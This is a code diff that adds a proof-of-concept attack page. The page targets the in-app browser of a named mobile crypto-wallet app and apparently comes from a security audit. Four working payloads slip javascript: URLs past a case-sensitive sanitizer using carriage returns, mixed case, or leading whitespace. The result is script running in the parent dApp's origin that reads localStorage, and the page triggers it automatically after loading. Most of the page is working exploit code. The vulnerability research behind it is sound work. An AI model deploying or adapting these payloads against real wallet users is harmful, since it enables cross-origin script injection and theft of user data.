@@ -1,13 +1,76 @@
-<!doctype html><html><body>
-<button id="b" style="font-size:40px;padding:30px">TAP ME</button>
-<div id="log"></div>
+<!--
+F01 PoC - attacker iframe payload
+Target: MetaMask Mobile 7.78.0 (commit 3751d9a)
+Sanitizer evidence: app/util/url/sanitizeUrlInput.ts:2 (case-sensitive ^javascript:)
+Sink evidence: app/components/Views/BrowserTab/BrowserTab.tsx:770-777 (handleOpenWindow)
+Runtime confirmation: REQUIRED on iOS WKWebView (no device available during static audit)
+
+Expected outcome on iOS:
+  When this page is embedded as an iframe inside any dApp loaded in the MetaMask
+  Mobile in-app browser, calling window.open("Javascript:...") fires the parent
+  WebView's onOpenWindow callback. handleOpenWindow then calls
+  webviewRef.current.injectJavaScript(`window.location.href = 'Javascript:...';`).
+  The JS runs in the MAIN FRAME's origin (the parent dApp's origin), not the iframe's.
+  Result: alert displays the parent dApp's document.domain.
+
+Falsified if:
+  - WebKit URL parser is no longer case-insensitive (will not happen)
+  - MM patches sanitizeUrlInput regex to /^javascript:/i AND strips leading whitespace
+  - react-native-webview onOpenWindow gates on source-frame info (not in 14.6.0)
+-->
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>F01 attacker iframe</title></head>
+<body>
+<h3>F01 attacker iframe (loaded inside parent dApp)</h3>
+<p>This iframe will, after a 500ms delay, call <code>window.open("Javascript:...")</code> with a mixed-case scheme that bypasses the case-sensitive sanitizer.</p>
+<button id="go">Trigger UXSS</button>
+<pre id="log"></pre>
 <script>
-  const log = (m) => document.getElementById('log').innerHTML += m + '<br>';
-  log('iframe loaded, origin: ' + location.origin);
-  document.getElementById('b').onclick = () => {
-    log('click fired, calling window.open...');
-    const w = window.open('https://example.com/');
-    log('window.open returned: ' + w);
-  };
+  // FOUR independent bypass payloads. Any one is sufficient for UXSS.
+  // The sanitizer is sanitizeUrlInput at app/util/url/sanitizeUrlInput.ts:
+  //
+  //   const blacklistRegex = /^javascript:/;
+  //   if (blacklistRegex.test(url)) return '';
+  //   return url.replace(/'/g, '%27').replace(/[\r\n]/g, '');
+  //
+  // Each payload is constructed so that AFTER sanitizeUrlInput returns,
+  // the string interpolated into `window.location.href = '<X>';` resolves
+  // (in any browser, ignoring case-insensitivity edge cases) to a `javascript:` URL.
+
+  // Payload (A) — STRONGEST: newline injection.
+  // The blacklistRegex test runs BEFORE \r\n stripping. Input "\rjavascript:..."
+  // fails ^javascript: (starts with \r), passes the test, then \r is stripped,
+  // and the function returns "javascript:alert(...)" verbatim. Works in all browsers
+  // regardless of WebKit case-insensitivity, on any react-native-webview build.
+  const PAYLOAD_A = "\rjavascript:alert('UXSS in '+document.domain+' / localStorage='+JSON.stringify(localStorage))";
+
+  // Payload (B) — case-insensitive scheme bypass. Browser parsers match
+  // schemes case-insensitively per WHATWG URL spec; sanitizer regex does not.
+  const PAYLOAD_B = "Javascript:alert('case bypass: '+document.domain)";
+
+  // Payload (C) — leading whitespace bypass. WHATWG URL parser strips leading
+  // C0 controls + U+0020 before scheme parsing; sanitizer does not.
+  const PAYLOAD_C = "\tjavascript:alert('whitespace bypass: '+document.domain)";
+
+  // Payload (D) — newline + uppercase combo. Strongest if any single
+  // technique is patched.
+  const PAYLOAD_D = "\nJAVASCRIPT:alert('combo bypass: '+document.domain)";
+
+  function trigger(payload) {
+    log('about to window.open: ' + JSON.stringify(payload));
+    const w = window.open(payload);
+    log('open returned: ' + (w === null ? 'null (intercepted by RN onOpenWindow)' : 'window object'));
+  }
+
+  function log(s) {
+    document.getElementById('log').textContent += s + '\n';
+  }
+
+  document.getElementById('go').addEventListener('click', () => trigger(PAYLOAD_A));
+
+  // Auto-trigger on load for fully unattended PoC.
+  setTimeout(() => trigger(PAYLOAD_A), 500);
 </script>
-</body></html>
+</body>
+</html>
